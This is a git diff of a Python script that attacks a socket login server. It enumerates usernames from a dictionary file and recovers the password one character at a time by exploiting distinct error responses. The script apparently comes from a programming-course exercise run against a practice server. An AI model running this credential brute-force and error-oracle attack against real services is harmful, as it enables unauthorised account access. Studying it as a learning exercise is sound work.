@@ -2,24 +2,17 @@ from itertools import product
 import socket
 import sys
 import string
+import json
 
 
-def password_generator():
+def password_generator(length=1000000) -> str:
     possible_symbols = string.ascii_letters + string.digits
-    for i in range(1_000_000):
+    for i in range(length):
         for message in product(possible_symbols, repeat=i + 1):
-            yield message
+            yield "".join(message)
 
 
-def connect_to_server(arguments):
-    _ip_address = arguments[1]
-    _port = int(arguments[2])
-    _client_soket = socket.socket()
-    _client_soket.connect((_ip_address, _port))
-    return _client_soket
-
-
-def brute_force(client_socket):  # client_socket
+def brute_force():  # client_socket
     generator = password_generator()
     for message in generator:
         password = ''.join(message)
@@ -40,16 +33,46 @@ def case_generator(_password) -> str:
         yield _password
 
 
+def send_and_recv_json_request(message) -> str:
+    client_socket.send(message.encode())
+    return client_socket.recv(1024).decode()
+
+
 def try_dictionary_password(_dict_file, _client_socket):
-    password_pull = tuple(sorted(open(_dict_file).read().split("\n")))
-    for password in password_pull:
-        generator = case_generator(password)
-        for pas in generator:
-            _client_socket.send(pas.encode())
-            response = _client_socket.recv(1024).decode()
+    password_pool = tuple(open(_dict_file).read().split('\n'))
+    for password in password_pool:
+        for password_variant in case_generator(password):
+            response = send_and_recv_json_request(password_variant)
             if response == "Connection success!":
-                print(pas)
+                print(password_variant)
                 exit()
+
+
+def hack_login(_dict_file):
+    # find login first, then find password, then send request
+    logins_pool = [login for login in tuple(open(_dict_file).read().split('\n')) if login]
+    # iterating throug the loggins pool
+    for login in logins_pool:
+        generator_logins = case_generator(login)
+        for login_variant in generator_logins:
+            message = {"login": login_variant, "password": ""}
+            response = send_and_recv_json_request(json.dumps(message))
+            if json.loads(response)["result"] == "Wrong password!":
+                return login_variant
+
+
+def hack_password(login, password_beginning=""):
+    for password in password_generator(length=1):
+        if password_beginning:
+            password = password_beginning + password
+        message = {"login": login, "password": password}
+        # reading response from server
+        response = send_and_recv_json_request(json.dumps(message))
+        if json.loads(response)["result"] == "Exception happened during login":
+            return hack_password(login, password_beginning=password)
+        if json.loads(response)["result"] == "Connection success!":
+            print(json.dumps(message))
+            exit()
 
 
 def main():
@@ -57,10 +80,20 @@ def main():
     if len(args) < 3:
         print("Not enough arguments. Please provide : ip_address, port, message")
         exit()
-    client_socket = connect_to_server(args)
-    dictionary_file = "hacking/passwords.txt"
-    try_dictionary_password(dictionary_file, client_socket)
-    client_socket.close()  # close connection
+    ip_address = args[1]
+    port = int(args[2])
+    global client_socket
+    client_socket = socket.socket()
+    client_socket.connect((ip_address, port))
+    dictionary_file = "hacking/logins.txt"
+    # try_dictionary_password(dictionary_file, client_socket)
+    login = hack_login(dictionary_file)
+    if not login:
+        print("sorry, no more logins in DB file")
+    else:
+        hack_password(login)
+
+    client_socket.close()
 
 
 if __name__ == '__main__':
